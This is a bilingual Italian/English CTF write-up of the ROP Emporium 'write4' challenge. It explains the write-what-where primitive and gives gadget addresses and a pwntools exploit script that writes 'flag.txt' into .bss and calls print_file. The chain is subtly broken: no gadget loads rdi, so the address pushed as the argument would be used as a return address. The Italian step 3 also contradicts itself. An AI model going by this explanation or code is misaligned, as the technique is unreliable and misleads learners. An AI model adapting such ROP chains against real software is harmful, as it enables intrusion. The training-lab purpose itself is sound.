---
layout: cyber-post
title: "ROP Emporium: write4 - Write-what-where with gadgets"
date: 2024-11-10
categories: 
  - writeups
  - stack
tags:
  - rop
  - write-what-where
  - gadgets
  - rop emporium
  - stack
  - pwn
  - ctf
excerpt: "Writeup di write4 (ROP Emporium): quando non c'è la stringa /bin/sh o flag.txt nel binario, la si scrive noi in una sezione scrivibile usando un gadget mov [reg], reg"
---

<div id="star-alert" class="star-alert">
  <div class="star-alert-content">
    <span class="star-icon">⭐</span>
    <span class="star-text lang-it">Ti piace il sito?</span>
    <span class="star-text lang-en">Do you like the site?</span>
    <br>
    <span class="star-text lang-it">Lascia una stella su GitHub!</span>
    <span class="star-text lang-en">Leave a star on GitHub!</span>
    <br>
    <a href="https://github.com/Chris1sFlaggin/Chris1sFlaggin.github.io" target="_blank" class="star-button">
      <span class="lang-it">⭐ Stella</span>
      <span class="lang-en">⭐ Star</span>
    </a>
    <button id="close-star-alert" class="close-button">&times;</button>
  </div>
</div>

<div class="lang-it" markdown="1">
PWN CTF challenge write up. Challenge della serie **ROP Emporium**, ottima per imparare le catene ROP passo passo.

---

# write4

## Il problema

`write4` introduce la primitiva **write-what-where**. Il binario espone una funzione `print_file(char *path)` che stampa il contenuto del file il cui nome passiamo in `rdi`. Il problema: la stringa `"flag.txt"` **non è presente** nel binario, quindi dobbiamo scriverla noi in una zona di memoria scrivibile.

Abbiamo overflow lineare (offset `40` fino al return address) e i seguenti gadget utili:

</div>

<div class="lang-en" markdown="1">
PWN CTF challenge write up. Challenge from the **ROP Emporium** series, great for learning ROP chains step by step.

---

# write4

## The problem

`write4` introduces the **write-what-where** primitive. The binary exposes a `print_file(char *path)` function that prints the contents of the file whose name we pass in `rdi`. The catch: the string `"flag.txt"` is **not present** in the binary, so we must write it ourselves into a writable region.

We have a linear overflow (offset `40` to the return address) and these useful gadgets:

</div>

```zsh
0x400690 : pop r14 ; pop r15 ; ret
0x400628 : mov qword [r14], r15 ; ret     # <-- la write-what-where
0x400510 : print_file (PLT)
```

<div class="lang-it" markdown="1">
## L'exploit

La sezione `.bss`/`.data` scrivibile la troviamo attorno a `0x601000`; usiamo `0x601400`, ben lontano da dati critici. La catena:

1. `pop r14 ; pop r15` → carichiamo `r14 = 0x601400` (dove scrivere) e `r15 = "flag.txt"` (cosa scrivere).
2. `mov qword [r14], r15` → scrive gli 8 byte `"flag.txt"` in `0x601400`.
3. `pop r14 ; pop r15` (in realtà ci basta un `ret` per l'allineamento) → poi carichiamo `rdi`... ma qui `print_file` viene chiamata con l'argomento già predisposto. Nella soluzione mostrata si mette l'indirizzo del buffer sullo stack e si chiama `print_file`, che prende `flag.txt` come path.

</div>

<div class="lang-en" markdown="1">
## The exploit

The writable `.bss`/`.data` section sits around `0x601000`; we use `0x601400`, well clear of critical data. The chain:

1. `pop r14 ; pop r15` → load `r14 = 0x601400` (where to write) and `r15 = "flag.txt"` (what to write).
2. `mov qword [r14], r15` → writes the 8 bytes `"flag.txt"` into `0x601400`.
3. a `ret` for alignment, then call `print_file` with the buffer address as `path`, reading `flag.txt`.

</div>

```python
from pwn import *

p = remote('192.168.0.200', 1247)

writeable    = 0x601400
pop_r14_r15  = 0x400690      # pop r14 ; pop r15 ; ret
write_gadget = 0x400628      # mov [r14], r15 ; ret
print_file   = 0x400510
ret          = 0x400693

p.recvuntil(b'>')

payload  = b'A'*40
payload += p64(pop_r14_r15) + p64(writeable) + b'flag.txt'   # r14=dst, r15="flag.txt"
payload += p64(write_gadget)                                 # *r14 = r15
payload += p64(ret)                                          # allineamento stack
payload += p64(writeable)                                    # arg per print_file
payload += p64(print_file)

p.sendline(payload)
p.interactive()
```

<div class="lang-it" markdown="1">
Il concetto chiave: un singolo gadget `mov [reg], reg` è tutto ciò che serve per trasformare un overflow in una scrittura arbitraria in memoria. Da lì, popolare argomenti per una funzione target è banale.

> 💭 Se hai bisogno di chiarimenti scrivimi pure su discord: *chris1sflaggin*.
</div>

<div class="lang-en" markdown="1">
The key idea: a single `mov [reg], reg` gadget is all you need to turn an overflow into an arbitrary memory write. From there, staging arguments for a target function is trivial.

> 💭 If you need any clarification, feel free to text me on discord: *chris1sflaggin*.
</div>
